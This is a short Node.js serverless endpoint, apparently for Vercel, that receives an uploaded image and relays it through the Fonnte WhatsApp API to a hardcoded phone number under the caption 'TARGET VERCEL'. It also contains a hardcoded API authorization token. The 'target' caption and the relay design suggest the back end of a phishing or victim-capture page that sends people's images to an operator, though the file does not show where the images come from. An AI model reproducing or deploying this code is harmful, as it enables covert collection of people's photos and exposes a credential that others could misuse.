// api/upload.js
const axios = require('axios');

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        const { image } = req.body;
        try {
            const response = await axios.post('https://api.fonnte.com/send', {
                target: '6283823170469',
                url: image,
                caption: '🚨 *TARGET VERCEL* 🚨',
            }, {
                headers: { 'Authorization': 'PG3GRjmArXV4PHYgQaFz' }
            });
            res.status(200).json({ success: true });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    } else {
        res.status(405).send('Method Not Allowed');
    }
};